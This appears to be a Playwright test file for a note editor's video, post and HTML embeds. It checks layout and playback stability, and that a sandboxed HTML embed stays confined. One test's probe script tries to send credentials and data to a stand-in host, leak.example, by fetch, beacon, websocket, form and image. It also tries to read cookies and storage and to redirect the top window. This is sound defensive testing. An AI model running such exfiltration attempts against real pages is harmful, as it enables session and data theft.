import { expect, type Frame, type Page, type Request } from "@playwright/test";
import { fetched, frameOrigin, ownFrame, perform, signInAsNewPerson, test, THEIR_FRAMES } from "./helpers.ts";
import { PLAYER, standIns } from "./media-helpers.ts";

let errors: string[];
test.beforeEach(({ page }) => {
  errors = [];
  page.on("pageerror", (err) => errors.push(err.message));
});
test.afterEach(() => expect(errors).toEqual([]));

const editor = (page: Page) => page.getByRole("textbox", { name: "Note text" });
const line = (page: Page, text: string) => page.locator(".cm-line").filter({ hasText: text });
const menu = (page: Page) => page.getByRole("listbox");
const below = (page: Page, embed: string) => page.locator(`.embed-below[data-embed="${embed}"]`);
/** The documents HTML embeds are running as, which have no address. */
const running = (page: Page) => page.frames().filter((f) => f.url() === "about:srcdoc" && !ownFrame(f));
const runHtml = (page: Page) => below(page, "html").getByRole("button", { name: "Run HTML" });
const settled = (page: Page) => page.evaluate(() => new Promise((done) => setTimeout(() => requestAnimationFrame(() => requestAnimationFrame(done)), 50)));

/**
 * Signs in and opens a note with this text, with the cursor at its start. The member has chosen to run HTML by itself unless
 * `settings` say otherwise: a server with no site of HTML embeds' own, as a built Worker, asks first until the member chooses.
 */
async function open(page: Page, text: string, settings: Record<string, unknown> = { "html.run": "automatically" }) {
  await signInAsNewPerson(page, "Ada Lovelace");
  await perform(page, { type: "settings.write", text: JSON.stringify(settings), baseRevision: 0 });
  const note = await perform(page, { type: "note.create", text });
  await page.goto(`/note/${note.id}`);
  await expect(editor(page)).toContainText(text.split("\n")[0]!.replace(/^# /, ""));
  await editor(page).focus();
  await page.keyboard.press("ControlOrMeta+Home");
  return note;
}

/** Puts the cursor on a line of the note, counted from 1, at its start or its end. */
async function goTo(page: Page, lineNumber: number, side: "Home" | "End" = "End") {
  await editor(page).focus();
  await page.keyboard.press("ControlOrMeta+Home");
  for (let i = 1; i < lineNumber; i++) await page.keyboard.press("ArrowDown");
  await page.keyboard.press(side);
}

const player = (page: Page) => page.frames().find((f) => f.url().startsWith(PLAYER));
const playing = (frame: Frame) => frame.evaluate(() => ({ born: (window as unknown as { born: string }).born, ticks: (window as unknown as { ticks: number }).ticks }));

/** Marks the frame in `embed`'s element, and counts every time it or anything around it is taken out of the page or put into it from here on. */
const watch = (page: Page, embed: string) =>
  page.evaluate((name) => {
    const frame = document.querySelector(`.embed-below[data-embed="${name}"] iframe`) as HTMLIFrameElement & { marked?: boolean };
    frame.marked = true;
    const seen = window as unknown as { moves: number };
    seen.moves = 0;
    new MutationObserver((records) => {
      for (const record of records) for (const node of [...record.addedNodes, ...record.removedNodes]) if (node.contains(frame)) seen.moves++;
    }).observe(document, { childList: true, subtree: true });
  }, embed);

const kept = (page: Page, embed: string) =>
  page.evaluate((name) => {
    const frame = document.querySelector(`.embed-below[data-embed="${name}"] iframe`) as (HTMLIFrameElement & { marked?: boolean }) | null;
    return { same: frame?.marked === true, moves: (window as unknown as { moves: number }).moves };
  }, embed);

/** Where an embed's element is and where the room kept for it in the note is. They are the same place while the room is on screen. */
const placed = (page: Page, embed: string) =>
  page.evaluate((name) => {
    const box = (el: Element | null) => {
      const rect = el?.getBoundingClientRect();
      return rect ? [rect.left, rect.top, rect.width, rect.height].map(Math.round) : null;
    };
    const rooms = [...document.querySelectorAll(".embed-below-room > div")];
    const all = [...document.querySelectorAll(".embed-below")];
    const el = document.querySelector(`.embed-below[data-embed="${name}"]`);
    return { el: box(el), room: rooms.length === all.length ? box(rooms[all.indexOf(el!)] ?? null) : null };
  }, embed);

async function expectOverItsRoom(page: Page, embed: string, when: string) {
  await expect
    .poll(async () => {
      const { el, room } = await placed(page, embed);
      return el && room ? Math.max(...el.map((side, i) => Math.abs(side - room[i]!))) : Infinity;
    }, when)
    .toBeLessThanOrEqual(1);
}

test("a note that writes `::youtube{}`, `::social{}` or `::link{}` shows them as the text they are, the insert menu offers none of them, and nothing is asked of another site", async ({ page, baseURL }) => {
  const outside: string[] = [];
  // Frames the app makes for its own plugins come from where frames are served, which is no other site.
  const frames = await frameOrigin(page);
  page.on("request", (request) => !request.url().startsWith(new URL(baseURL!).origin) && !request.url().startsWith(`${frames}/embed-frame`) && outside.push(request.url()));
  const old = "# Old\n\nOne ::youtube{https://youtu.be/dQw4w9WgXcQ} two\n\n::social{https://x.com/jack/status/20}\n\n::link{https://example.com/docs The docs}\n\nlast";
  const note = await open(page, old);
  await expect(line(page, "One")).toHaveText("One ::youtube{https://youtu.be/dQw4w9WgXcQ} two");
  await expect(line(page, "::social")).toHaveText("::social{https://x.com/jack/status/20}");
  await expect(line(page, "::link")).toHaveText("::link{https://example.com/docs The docs}");
  await expect(editor(page).locator(".embed-frame")).toHaveCount(0);
  await expect(page.locator(".embed-below")).toHaveCount(0);
  await expect(page.locator(THEIR_FRAMES)).toHaveCount(0);

  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type("\n\n/", { delay: 20 });
  const options = menu(page).getByRole("option");
  await expect(options.first()).toBeVisible();
  const offered = await options.allTextContents();
  expect(offered.join("\n")).not.toMatch(/YouTube|Video|Social|Post|Link|::youtube|::social|::link/);
  expect(offered.some((o) => o.startsWith("Timer"))).toBe(true);
  await page.keyboard.press("Escape");
  await page.keyboard.press("Backspace");
  await expect.poll(async () => (await perform(page, { type: "note.read", id: note.id })).text).toBe(`${old}\n\n`);
  expect(outside).toEqual([]);
});

test("a playing video is never loaded again, stopped, or moved in the page by anything but a change to its own source", async ({ page }) => {
  test.slow();
  // Wide enough that the embed's line is one row as written, so Home and End are the ends of the line.
  await page.setViewportSize({ width: 1800, height: 900 });
  const asked = await standIns(page);
  const filler = Array.from({ length: 400 }, (_, i) => `filler ${i}`).join("\n");
  const text = `# Video\n\nfirst above\nsecond above\n\nhttps://youtu.be/dQw4w9WgXcQ\n\nfirst below\nsecond below\n\n${filler}\n`;
  const note = await open(page, text);

  // Its picture and what it is called are there before anything is pressed, and its player is not.
  const play = below(page, "video").getByRole("button", { name: "Play video: Stand-in video" });
  await expect(play.locator("img")).toHaveAttribute("src", "https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg");
  await expect(play).toContainText("Stand-in video");
  expect(asked).toEqual([]);
  const size = (await placed(page, "video")).el;
  await play.click();
  await expect.poll(() => player(page)?.url()).toBe(`${PLAYER}embed/dQw4w9WgXcQ?autoplay=1`);
  await expect.poll(async () => (await placed(page, "video")).el, "the player is where the picture was, as large").toEqual(size);
  const frame = below(page, "video").locator("iframe");
  await expect(frame).toHaveAttribute("sandbox", "allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox allow-presentation");
  await expect(frame).toHaveAttribute("referrerpolicy", "strict-origin");
  const { born } = await playing(player(page)!);
  await watch(page, "video");

  let ticks = 0;
  const expectStillPlaying = async (when: string) => {
    await expect.poll(async () => (await playing(player(page)!)).ticks, `counting on ${when}`).toBeGreaterThan(ticks);
    const now = await playing(player(page)!);
    ticks = now.ticks;
    expect(now.born, `the same load ${when}`).toBe(born);
    expect(asked, `asked for once ${when}`).toHaveLength(1);
    await expect.poll(() => kept(page, "video"), `the same element, never moved, ${when}`).toEqual({ same: true, moves: 0 });
  };
  await expectStillPlaying("after it started");

  await goTo(page, 3);
  await page.keyboard.type(" with words typed above");
  await expectStillPlaying("after typing above");
  await expectOverItsRoom(page, "video", "after typing above");

  await page.keyboard.type("\nnew line one\nnew line two\nnew line three");
  await expectStillPlaying("after lines were added above");
  await expectOverItsRoom(page, "video", "after lines were added above");

  await page.keyboard.press("Home");
  for (let i = 0; i < 2; i++) await page.keyboard.press("Shift+ArrowUp");
  await page.keyboard.press("Backspace");
  await expect(editor(page)).not.toContainText("new line two");
  await expectStillPlaying("after lines were removed above");
  await expectOverItsRoom(page, "video", "after lines were removed above");

  // Its own line: the cursor arriving shows the address, which is not a change to it.
  await goTo(page, 7);
  await expect(line(page, "youtu.be")).toHaveClass(/embed-address/);
  await expectStillPlaying("with the cursor on its own line");
  await expectOverItsRoom(page, "video", "with the cursor on its own line");

  await goTo(page, 9);
  await page.keyboard.type(" with words typed below\nand a line added below");
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("Home");
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Backspace");
  await expect(editor(page)).not.toContainText("second below");
  await expectStillPlaying("after typing, adding and removing lines below");

  await page.keyboard.press("Enter");
  await page.keyboard.press("ArrowUp");
  await page.keyboard.type("https://youtu.be/aaaaaaaaaaa");
  await expect(below(page, "video")).toHaveCount(2);
  await page.keyboard.press("Backspace");
  await page.keyboard.type("b");
  await expect(below(page, "video")).toHaveCount(2);
  await expectStillPlaying("after another embed was written and changed");

  await expect(page.getByRole("status")).toHaveText("Saved");
  const mine = await perform(page, { type: "note.read", id: note.id });
  await perform(page, { type: "note.write", id: note.id, baseRevision: mine.revision, text: mine.text.replace("# Video\n", "# Video\n\nA paragraph from somewhere else.\n").replace("first below", "first below, changed elsewhere") });
  await page.evaluate(() => window.dispatchEvent(new Event("focus")));
  await expect(editor(page)).toContainText("A paragraph from somewhere else.", { timeout: 30_000 });
  await expect(editor(page)).toContainText("first below, changed elsewhere");
  await expectStillPlaying("after someone else's change landed above and below");
  await expectOverItsRoom(page, "video", "after someone else's change landed");

  // Far out of sight the note no longer holds its room, and it goes on playing where the room will be again.
  await editor(page).focus();
  await page.keyboard.press("ControlOrMeta+End");
  await expect(page.locator(".embed-below-room")).toHaveCount(0);
  await page.keyboard.type("typed at the far end");
  await expectStillPlaying("while scrolled far away");
  await page.keyboard.press("ControlOrMeta+Home");
  await expect(page.locator(".embed-below-room")).toHaveCount(2);
  await expectStillPlaying("after scrolling back");
  await expectOverItsRoom(page, "video", "after scrolling back");

  // Its own source: the one thing that draws it again, once, in the element and the place it has.
  await page.evaluate(() => ((document.querySelector(".embed-below iframe")!.closest(".embed-below") as HTMLElement & { marked?: boolean }).marked = true));
  await goTo(page, 9);
  await expect(line(page, "youtu.be/dQw4w9WgXcQ")).toHaveClass(/embed-address/);
  await expectOverItsRoom(page, "video", "with the cursor in its source");
  const boxBefore = (await placed(page, "video")).el;
  // One change that leaves it a video's address: with a character short it would be no video, and gone.
  await page.keyboard.press("Shift+ArrowLeft");
  await page.keyboard.type("c");
  await expect(line(page, "youtu.be/dQw4w9WgXcc")).toBeVisible();
  await expect.poll(() => player(page)).toBeUndefined();
  const again = page.locator(".embed-below").first();
  await expect.poll(() => again.evaluate((el: HTMLElement & { marked?: boolean }) => el.marked), "drawn again in the element it had").toBe(true);
  await expect.poll(async () => (await placed(page, "video")).el, "and in the place it had").toEqual(boxBefore);
  await expect(below(page, "video").getByRole("button", { name: /^Play video/ })).toHaveCount(2);
  expect(asked).toHaveLength(1);
  await again.getByRole("button", { name: /^Play video/ }).click();
  await expect.poll(() => player(page)?.url()).toBe(`${PLAYER}embed/dQw4w9WgXcc?autoplay=1`);
  expect(asked).toHaveLength(2);
});

test("a video's address takes no room until the cursor is on its line, not when the pointer is on the video, and then only it and what is below it move, by its line", async ({ page }) => {
  await standIns(page);
  await page.setViewportSize({ width: 1800, height: 1400 });
  await open(page, "# Video\n\nbefore it\n\nhttps://youtu.be/dQw4w9WgXcQ\n\nbetween them\n\nhttps://youtu.be/aaaaaaaaaaa\n\nafter them\n");
  // The folder's name comes after the note and can change the height of the bar above it, and the faces come when they come.
  await expect(page.locator(".note-tools")).toBeVisible();
  await page.evaluate(() => document.fonts.ready);
  const measured = () =>
    page.evaluate(() => {
      const box = (el: Element) => {
        const rect = el.getBoundingClientRect();
        return [rect.left, rect.top, rect.width, rect.height];
      };
      return {
        lines: [...document.querySelectorAll(".cm-content .cm-line")].map(box),
        rooms: [...document.querySelectorAll(".embed-below-room > div")].map(box),
        shown: [...document.querySelectorAll(".embed-below")].map(box),
      };
    });
  /** The addresses shown. */
  const seen = () => page.locator(".cm-line.embed-address").allTextContents();
  /** Everything as it was before, but what is at or below the address shown, which is lower by its line, and the address's own line. */
  const movedBy = async (before: Awaited<ReturnType<typeof measured>>) => {
    const address = (await page.locator(".cm-line.embed-address").boundingBox())!;
    const lower = (box: number[]): number[] => (box[1]! >= address.y - 0.5 ? [box[0]!, box[1]! + address.height, box[2]!, box[3]!] : box);
    const rounded = (boxes: number[][]) => boxes.map((box) => box.map((n) => Math.round(n! * 2) / 2));
    const lines = before.lines.map(lower);
    lines.splice(before.lines.filter((box) => box[1]! < address.y - 0.5).length, 0, [address.x, address.y, address.width, address.height]);
    return { lines: rounded(lines), rooms: rounded(before.rooms.map(lower)), shown: rounded(before.shown.map(lower)) };
  };
  const roundedNow = async () => {
    const now = await measured();
    const rounded = (boxes: number[][]) => boxes.map((box) => box.map((n) => Math.round(n! * 2) / 2));
    return { lines: rounded(now.lines), rooms: rounded(now.rooms), shown: rounded(now.shown) };
  };
  await expect(below(page, "video")).toHaveCount(2);
  await expect(below(page, "video").getByRole("button", { name: "Play video: Stand-in video" })).toHaveCount(2);
  await expect.poll(async () => (await measured()).shown).toEqual((await measured()).rooms);
  const before = await measured();
  expect(before.rooms[0]![3], "a 16:9 box from the first moment").toBeCloseTo(before.rooms[0]![2]! * (9 / 16), 0);
  // The note opens with the cursor where nobody put it, which shows nothing as written.
  await expect.poll(seen).toEqual([]);

  for (const [lineNumber, shows] of [[5, ["https://youtu.be/dQw4w9WgXcQ"]], [9, ["https://youtu.be/aaaaaaaaaaa"]], [3, []], [11, []]] as const) {
    await goTo(page, lineNumber);
    await expect.poll(seen, `with the cursor on line ${lineNumber}`).toEqual(shows);
    await settled(page);
    if (shows.length) await expect.poll(async () => (await roundedNow()), `with the cursor on line ${lineNumber}`).toEqual(await movedBy(before));
    else await expect.poll(() => measured(), `with the cursor on line ${lineNumber}`).toEqual(before);
  }
  // The pointer shows nothing on a video.
  for (const [where, at] of [["the second video", below(page, "video").nth(1)], ["the first video", below(page, "video").first()]] as const) {
    await at.hover();
    await settled(page);
    await expect.poll(seen, `with the pointer on ${where}`).toEqual([]);
    await expect.poll(() => measured(), `with the pointer on ${where}`).toEqual(before);
  }
  await page.mouse.move(2, 2);

  // The keys reach it as they reach any line, and it reads as it is written.
  await goTo(page, 5);
  await expect(page.locator(".cm-line").nth(4)).toHaveText("https://youtu.be/dQw4w9WgXcQ");
  await expect.poll(seen).toEqual(["https://youtu.be/dQw4w9WgXcQ"]);

  await below(page, "video").first().getByRole("button", { name: /^Play video/ }).click();
  await expect.poll(() => player(page)).toBeDefined();
  await expect(below(page, "video").first().locator("iframe")).toBeVisible();
  await page.mouse.move(2, 2);
  await goTo(page, 1);
  await expect.poll(seen).toEqual([]);
  await settled(page);
  await expect.poll(() => measured(), "after the video loaded").toEqual(before);
});

test("each thing below a line is one box with one radius, and what is in it fills it and is cut to it", async ({ page }) => {
  await standIns(page);
  await page.setViewportSize({ width: 1280, height: 1600 });
  await open(page, "# Corners\n\nhttps://youtu.be/dQw4w9WgXcQ\n\nhttps://x.com/jack/status/20\n\n/html(height=80)\n~~~html\n<b>hello</b>\n~~~\n\nlast\n");
  await below(page, "video").getByRole("button", { name: /^Play video/ }).click();
  await expect(page.locator(".embed-below iframe")).toHaveCount(3);
  const drawn = (embed: string) =>
    below(page, embed).evaluate((box) => {
      const style = getComputedStyle(box);
      const frame = box.querySelector("iframe")!.getBoundingClientRect();
      const inner = { left: box.getBoundingClientRect().left + box.clientLeft, top: box.getBoundingClientRect().top + box.clientTop };
      return {
        radius: style.borderRadius,
        cut: style.overflow,
        border: style.borderTopWidth,
        fills: Math.abs(frame.left - inner.left) < 0.5 && Math.abs(frame.top - inner.top) < 0.5 && Math.abs(frame.width - box.clientWidth) < 0.5 && Math.abs(frame.height - box.clientHeight) < 0.5,
      };
    });
  await expect.poll(() => drawn("video")).toEqual({ radius: "10px", cut: "hidden", border: "1px", fills: true });
  // A post's own site draws its border and its corners, so the box adds no edge of its own and is cut where the post's is.
  await expect.poll(() => drawn("post")).toEqual({ radius: "12px", cut: "hidden", border: "0px", fills: true });
  await expect.poll(async () => (await below(page, "post").boundingBox())!.width).toBe(550);
  // A block's frame is the body of its card: the card has the top corners, the frame the bottom ones, and they are as wide as each other.
  await expect.poll(() => drawn("html")).toEqual({ radius: "0px 0px 10px 10px", cut: "hidden", border: "1px", fills: true });
  const card = editor(page).locator(".embed-joined > .embed-card");
  await expect(card).toHaveCSS("border-radius", "10px 10px 0px 0px");
  const [head, body] = [(await card.boundingBox())!, (await below(page, "html").boundingBox())!];
  expect([body.x, body.width, body.y]).toEqual([head.x, head.width, head.y + head.height]);
});

test("an HTML embed is picked from the insert menu, runs by itself in its room with nothing to press, and stays running while the note is written around it", async ({ page }) => {
  await open(page, "# Scene\n\nabove\n\n");
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type("/html", { delay: 20 });
  await expect(menu(page).getByRole("option", { name: "HTML" })).toBeVisible();
  await settled(page);
  await page.keyboard.press("Enter");
  await page.keyboard.type("after the block");

  // It runs with nothing pressed, in the room it had from the start, and there is no button to run it.
  await expect(below(page, "html")).toBeVisible();
  const room = (await placed(page, "html")).el;
  const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
  await expect(framed.getByText("Hello from HTML.")).toBeVisible();
  await expect(runHtml(page)).toHaveCount(0);
  await expect.poll(async () => (await placed(page, "html")).el, "running, it is where its room was").toEqual(room);
  await expect(below(page, "html").locator("iframe")).toHaveAttribute("src", "/embed-frame");
  // What shuts it in is its document's own headers, which give it an origin with no name whatever the frame around it says.
  await expect.poll(() => running(page)[0]!.evaluate(() => self.origin)).toBe("null");
  // The frame says nothing of a sandbox itself: the Claude desktop app's browser refuses a local address to a frame that does, which left the embed a white box.
  await expect(below(page, "html").locator("iframe")).not.toHaveAttribute("sandbox");
  // The card has the block's name and its options, and no button of its own to show the block as written: the cursor does that.
  await expect(editor(page).locator(".embed-joined").getByRole("button")).toHaveCount(1);
  await expect(editor(page).getByRole("button", { name: "Settings for HTML" })).toBeVisible();

  // The block as written, with a counter in it. Its body changed, so what was running is gone and the new body runs.
  await goTo(page, 7);
  await expect(editor(page)).toContainText("<p>Hello from <b>HTML</b>.</p>");
  await page.keyboard.type("<script>window.born = String(Math.random()); window.ticks = 0; setInterval(() => window.ticks++, 20);</script>");
  await goTo(page, 3);
  await expect(line(page, "/html()")).toHaveCount(0);
  await expect.poll(async () => (await running(page)[0]?.evaluate(() => typeof (window as unknown as { ticks?: number }).ticks).catch(() => "")) ?? "").toBe("number");
  const { born } = await playing(running(page)[0]!);
  await watch(page, "html");
  await goTo(page, 3);

  let ticks = 0;
  const expectStillRunning = async (when: string) => {
    await expect.poll(async () => (await playing(running(page)[0]!)).ticks, `counting on ${when}`).toBeGreaterThan(ticks);
    const now = await playing(running(page)[0]!);
    ticks = now.ticks;
    expect(now.born, `the same load ${when}`).toBe(born);
    await expect.poll(() => kept(page, "html"), `the same element, never moved, ${when}`).toEqual({ same: true, moves: 0 });
  };
  await page.keyboard.type(" and more\nand a new line");
  await expectStillRunning("after typing above");
  await expectOverItsRoom(page, "html", "after typing above");
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type(" and more\nand a new line");
  await expectStillRunning("after typing below");

  // A press on the card's head puts the cursor in the block, which shows it as written. Nothing of it changed, so the frame stays.
  await editor(page).locator(".embed-joined .embed-head").click({ position: { x: 120, y: 12 } });
  await expect(editor(page)).toContainText("/html()");
  await expectStillRunning("with the cursor in its block");
  await expectOverItsRoom(page, "html", "with the cursor in its block");
  await page.keyboard.press("ControlOrMeta+Home");
  await expectStillRunning("after the cursor left its block");
  await expectOverItsRoom(page, "html", "after the cursor left its block");
});

test("an HTML embed can't reach the app, the member's session, the browser's storage, or the network", async ({ page, baseURL }) => {
  const app = new URL(baseURL!).origin;
  // What got as far as the network: a request the page's policy stops is never handed on to be answered.
  const reached: string[] = [];
  const answered: string[] = [];
  page.on("response", (response) => response.frame() !== page.mainFrame() && answered.push(new URL(response.url()).pathname + new URL(response.url()).search));
  // Anything that did get out would be answered, so a probe that reports failure was stopped, not unlucky.
  await page.context().route("https://leak.example/**", (route) => {
    reached.push(route.request().url());
    return route.fulfill({ status: 200, contentType: "text/plain", headers: { "Access-Control-Allow-Origin": "*" }, body: "leaked" });
  });

  const probe = `<p id="out">probing</p>
<script>
(async () => {
  const found = {};
  const attempt = async (name, run) => {
    try { found[name] = String(await run()); } catch (err) { found[name] = "refused: " + (err && err.name); }
  };
  const loads = (make) => new Promise((ok, no) => { const el = make(); el.onload = () => ok("loaded"); el.onerror = () => no({ name: "error" }); document.body.append(el); });
  await attempt("origin", () => self.origin);
  await attempt("fetch the app", () => fetch("${app}/api/me", { credentials: "include" }).then((r) => r.status));
  await attempt("fetch the app without cors", () => fetch("${app}/api/me", { mode: "no-cors", credentials: "include" }).then((r) => r.type));
  await attempt("fetch another site", () => fetch("https://leak.example/fetch").then((r) => r.status));
  await attempt("xhr", () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open("GET", "https://leak.example/xhr"); x.onload = () => ok(x.status); x.onerror = () => no({ name: "error" }); x.send(); }));
  await attempt("beacon", () => navigator.sendBeacon("https://leak.example/beacon", "x"));
  await attempt("websocket", () => new Promise((ok, no) => { const ws = new WebSocket("wss://leak.example/ws"); ws.onopen = () => ok("open"); ws.onerror = () => no({ name: "error" }); }));
  await attempt("event source", () => new Promise((ok, no) => { const es = new EventSource("https://leak.example/events"); es.onopen = () => ok("open"); es.onerror = () => no({ name: "error" }); }));
  await attempt("image", () => loads(() => Object.assign(new Image(), { src: "https://leak.example/image.png" })));
  await attempt("script", () => loads(() => Object.assign(document.createElement("script"), { src: "https://leak.example/script.js" })));
  await attempt("stylesheet", () => loads(() => Object.assign(document.createElement("link"), { rel: "stylesheet", href: "https://leak.example/style.css" })));
  await attempt("frame", () => loads(() => Object.assign(document.createElement("iframe"), { src: "https://leak.example/frame" })).then(() => "made"));
  await attempt("font", () => new FontFace("leak", "url(https://leak.example/font.woff2)").load().then(() => "loaded"));
  await attempt("worker", () => new Promise((ok, no) => { const w = new Worker("https://leak.example/worker.js"); w.onerror = () => no({ name: "error" }); setTimeout(() => ok("started"), 300); }));
  await attempt("service worker", () => navigator.serviceWorker.register("${app}/sw.js").then(() => "registered"));
  await attempt("parent document", () => parent.document.title);
  await attempt("parent location", () => parent.location.href);
  await attempt("top location", () => top.location.href);
  await attempt("navigate the top window", () => { top.location = "https://leak.example/top"; return "navigated"; });
  await attempt("parent storage", () => parent.localStorage.length);
  await attempt("localStorage", () => localStorage.length);
  await attempt("sessionStorage", () => sessionStorage.length);
  await attempt("cookie", () => { document.cookie = "probe=1"; return "cookie:" + document.cookie; });
  await attempt("indexedDB", () => new Promise((ok, no) => { const open = indexedDB.open("probe"); open.onsuccess = () => ok("opened"); open.onerror = () => no({ name: "error" }); }));
  await attempt("caches", () => caches.open("probe").then(() => "opened"));
  await attempt("popup", () => (window.open("https://leak.example/popup") ? "opened" : "refused: null"));
  await attempt("history", () => { history.pushState({}, "", "#pushed"); return "pushed"; });
  await attempt("form", () => new Promise((ok) => {
    const form = document.createElement("form");
    form.action = "https://leak.example/form";
    form.method = "post";
    document.body.append(form);
    form.submit();
    setTimeout(() => ok("still here"), 300);
  }));
  window.found = found;
  document.getElementById("out").textContent = "probed";
})();
</script>`;
  await page.setViewportSize({ width: 1280, height: 1400 });
  // Asked first, so the page's own history is read before anything has run.
  const note = await open(page, `# Probe\n\n/html(height=80)\n~~~html\n${probe}\n~~~\n\nend\n`, { "html.run": "ask first" });

  // Opening the note ran nothing.
  await settled(page);
  expect(page.frames().filter((f) => !ownFrame(f))).toHaveLength(1);
  const pages = await page.evaluate(() => history.length);
  await runHtml(page).click();
  const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");
  await expect(framed.locator("#out")).toHaveText("probed", { timeout: 30_000 });
  const found = await running(page)[0]!.evaluate(() => (window as unknown as { found: Record<string, string> }).found);
  expect(found).toEqual({
    origin: "null",
    "fetch the app": "refused: TypeError",
    "fetch the app without cors": "refused: TypeError",
    "fetch another site": "refused: TypeError",
    xhr: "refused: error",
    // Taken to be sent later, and then never sent: nothing reaches the other site, below.
    beacon: "true",
    websocket: "refused: error",
    "event source": "refused: error",
    image: "refused: error",
    script: "refused: error",
    stylesheet: "refused: error",
    // The element is made and says it loaded. Nothing was asked for: see what reached the network, below.
    frame: "made",
    font: "refused: NetworkError",
    worker: "refused: SecurityError",
    "service worker": "refused: SecurityError",
    "parent document": "refused: SecurityError",
    "parent location": "refused: SecurityError",
    "top location": "refused: SecurityError",
    "navigate the top window": "refused: SecurityError",
    "parent storage": "refused: SecurityError",
    localStorage: "refused: SecurityError",
    sessionStorage: "refused: SecurityError",
    cookie: "refused: SecurityError",
    indexedDB: "refused: SecurityError",
    caches: "refused: SecurityError",
    popup: "refused: null",
    history: "refused: SecurityError",
    form: "still here",
  });
  await expect.poll(() => page.evaluate(() => history.length), "it added nothing to what Back goes through").toBe(pages);

  await settled(page);
  expect(new URL(page.url()).origin, "the app's window was taken nowhere").toBe(app);
  expect(page.context().pages()).toHaveLength(1);
  expect(reached, "nothing reached another site").toEqual([]);
  expect([...new Set(answered)], "the app answered an embed with nothing but its own empty document").toEqual(["/embed-frame"]);
  // The member is still signed in, and the note is as it was.
  await expect.poll(async () => (await perform(page, { type: "note.read", id: note.id })).text).toContain("# Probe");
});

test("what is below a line is there, whole and in its place, in every frame painted: as the note loads, and as the note is written above it", async ({ page }) => {
  // What the note shows in each frame, read as the frame is laid out to be painted: after everything that
  // draws before a paint has run, and before any work for the next frame can. A box that changes size in
  // each frame is what gets the reading made then.
  await page.addInitScript(() => {
    const painted: unknown[] = [];
    (window as unknown as { painted: unknown[] }).painted = painted;
    const box = (el: Element) => {
      const rect = el.getBoundingClientRect();
      return [rect.left, rect.top, rect.width, rect.height].map(Math.round).join(" ");
    };
    const beat = document.createElement("div");
    beat.style.cssText = "position: fixed; top: 0; left: 0; height: 0; width: 1px; pointer-events: none";
    new ResizeObserver(() => {
      const content = document.querySelector(".cm-content");
      if (!content) return;
      painted.push({
        written: /\/html\(/.test(content.textContent!),
        rooms: [...document.querySelectorAll(".embed-below-room > div")].map(box),
        shown: [...document.querySelectorAll(".embed-below")].map(box),
        filled: [...document.querySelectorAll(".embed-below-drawn")].every((el) => el.childElementCount > 0),
      });
    }).observe(beat);
    let wide = false;
    const each = () => {
      if (!beat.isConnected) document.documentElement.append(beat);
      beat.style.width = (wide = !wide) ? "2px" : "1px";
      requestAnimationFrame(each);
    };
    requestAnimationFrame(each);
  });
  const frames = () => page.evaluate(() => (window as unknown as { painted: { written: boolean; rooms: string[]; shown: string[]; filled: boolean }[] }).painted.splice(0));
  await page.setViewportSize({ width: 1280, height: 1400 });
  await standIns(page);
  await open(page, "# Video\n\nabove\n\nhttps://youtu.be/dQw4w9WgXcQ\n\nhttps://bsky.app/profile/did:plc:z72i7hdynmk6r22z27h6tvur/post/3l6oveex3ii2l\n\n/html(height=120)\n~~~html\n<p>Hello</p>\n~~~\n\nafter\n");
  await expect(page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe").getByText("Hello")).toBeVisible();
  await settled(page);

  const loading = await frames();
  expect(loading.length).toBeGreaterThan(2);
  const final = loading.at(-1)!;
  expect(final.rooms).toHaveLength(3);
  for (const frame of loading) expect(frame, "a frame painted while the note loaded").toEqual({ written: false, rooms: final.rooms, shown: final.rooms, filled: true });

  await goTo(page, 3);
  await frames();
  await page.keyboard.type(" and more\nline\nline\nline", { delay: 30 });
  await page.keyboard.press("Backspace");
  await page.keyboard.press("Backspace");
  await settled(page);
  const writing = await frames();
  expect(writing.length).toBeGreaterThan(5);
  expect(new Set(writing.map((f) => f.rooms.join())).size, "the rooms moved as lines came and went").toBeGreaterThan(2);
  for (const frame of writing) expect({ ...frame, shown: frame.shown }, "a frame painted while writing above").toEqual({ written: false, rooms: frame.rooms, shown: frame.rooms, filled: true });
});

test("an HTML embed can't send its frame, or any frame, anywhere: not to a site the app frames, not to the app, not by a link, a refresh or a form", async ({ page, baseURL }) => {
  const app = new URL(baseURL!).origin;
  const sites = ["https://www.youtube-nocookie.com", "https://platform.twitter.com", "https://embed.bsky.app", "https://leak.example"];
  // What got as far as the network, on the sites the app may frame and on the app itself.
  const reached: string[] = [];
  for (const site of sites) {
    await page.context().route(`${site}/**`, (route) => {
      reached.push(route.request().url());
      return route.fulfill({ status: 200, contentType: "text/html", body: "<title>reached</title>" });
    });
  }
  // Its document comes from the app's own address, or from the host kept for embeds, which the app sends it to.
  const shell = await frameOrigin(page);
  const asked: string[] = [];
  page.on("request", (request) => request.frame() !== page.mainFrame() && [app, shell].some((host) => request.url().startsWith(host) && asked.push(request.url().slice(host.length))));

  const named = (name: string, body: string) => `/html(height=60)\n~~~html\n<script>window.probe = ${JSON.stringify(name)};</script>${body}\n~~~\n\n`;
  const later = (run: string) => `<script>setTimeout(() => { try { ${run}; window.did = "ran"; } catch (err) { window.did = "refused: " + err.name; } }, 200);</script>`;
  const embeds: [name: string, body: string][] = [
    ["to a site the app frames", later(`location.href = "https://www.youtube-nocookie.com/embed/x?leak=1"`)],
    ["to its own document's address", later(`location.href = ${JSON.stringify(`${app}/embed-frame?leak=2`)}`)],
    ["to the app", later(`location.href = ${JSON.stringify(`${app}/api/me?leak=3`)}`)],
    ["by a refresh", `<meta http-equiv="refresh" content="0; url=https://platform.twitter.com/embed/Tweet.html?leak=4">`],
    ["by a link", `<a id="a" href="https://embed.bsky.app/embed/leak?x=5">go</a>${later(`document.getElementById("a").click()`)}`],
    ["by a link to the top", `<a id="a" href="https://leak.example/top-link" target="_top">go</a>${later(`document.getElementById("a").click()`)}`],
    ["the frame around it", later(`parent.location.href = "https://www.youtube-nocookie.com/embed/x?leak=6"`)],
